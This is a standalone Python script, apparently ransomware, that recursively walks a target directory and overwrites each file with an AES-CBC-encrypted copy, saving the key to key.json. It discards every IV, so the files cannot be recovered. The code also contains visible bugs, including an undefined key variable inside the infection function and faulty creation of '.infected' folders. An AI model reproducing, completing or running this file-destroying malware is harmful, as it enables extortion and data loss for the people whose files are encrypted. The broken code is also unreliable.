import os, time, string, random, json, sys
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

def generate_key():
    return os.urandom(32)

def encrypt_file(filename, key):
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    
    with open(filename, 'rb') as f:
        plaintext = f.read()
    padding_length = 16 - (len(plaintext) % 16)
    if padding_length == 0:
        padding_length = 16
    padded_plaintext = plaintext + bytes([padding_length]) * padding_length

    ciphertext = encryptor.update(padded_plaintext) + encryptor.finalize()
    
    with open(filename, 'wb') as f:
        f.write(ciphertext)

def infect_directory(directory):
    for filename in os.listdir(directory):
        filepath = os.path.join(directory, filename)
        if os.path.isfile(filepath):
            encrypt_file(filepath, key)
        elif os.path.isdir(filepath) and not filepath.endswith('.infected'):
            os.makedirs(os.path.join(directory, '.infected'))
            infect_directory(filepath)

def main():
    directory = sys.argv[1]
    key = generate_key()
    
    with open('key.json', 'w') as f:
        json.dump({'key': key.hex()}, f)
    
    infect_directory(directory)

main()